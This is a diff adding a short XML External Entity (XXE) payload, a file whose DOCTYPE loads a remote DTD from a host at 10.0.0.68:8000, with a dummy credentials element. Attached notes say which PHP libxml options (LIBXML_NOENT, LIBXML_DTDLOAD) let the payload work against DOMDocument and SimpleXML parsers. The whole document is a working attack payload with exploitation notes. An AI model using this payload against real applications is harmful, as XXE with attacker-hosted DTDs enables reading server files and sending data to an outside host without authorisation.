@@ -1,0 +1,12 @@
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.0.0.68:8000/file.dtd"> %xxe;]>
+<creds>
+	<user>ss</user>
+    <pass>mypass</pass>
+</creds>
+
+
+
+// notes 
+in Domapi parser payload works with LIBXML_DTDLOAD LIBXML_NOENT options set or unset or either one of them is set it doesnt matter
+
+in simplexml payload works but you must specify LIBXML_NOENT options or both of them LIBXML_NOENT | LIBXML_DTDLOAD for the payload to work
